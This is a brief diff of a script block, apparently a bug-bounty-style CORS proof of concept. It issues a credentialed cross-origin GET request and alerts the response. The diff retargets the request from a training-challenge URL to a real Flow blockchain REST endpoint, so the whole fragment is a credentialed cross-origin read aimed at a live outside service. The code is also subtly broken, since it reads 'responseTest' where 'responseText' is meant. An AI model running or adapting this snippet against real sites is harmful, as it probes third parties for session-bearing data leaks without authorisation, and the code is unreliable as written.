@@ -6,7 +6,7 @@ xhttp.onreadystatechange = function() {
         alert(xhttp.responseTest);
       }
 };
-xhttp.open("GET","https://www.bugbountytraining.com/challenges/chattenge-16.php", true);
+xhttp.open("GET","https://rest-mainnet.onflow.org/v1/scripts?block_height=sealed", true);
 xhttp.withCredentials=true;
 xhttp.send() ;
 </script>
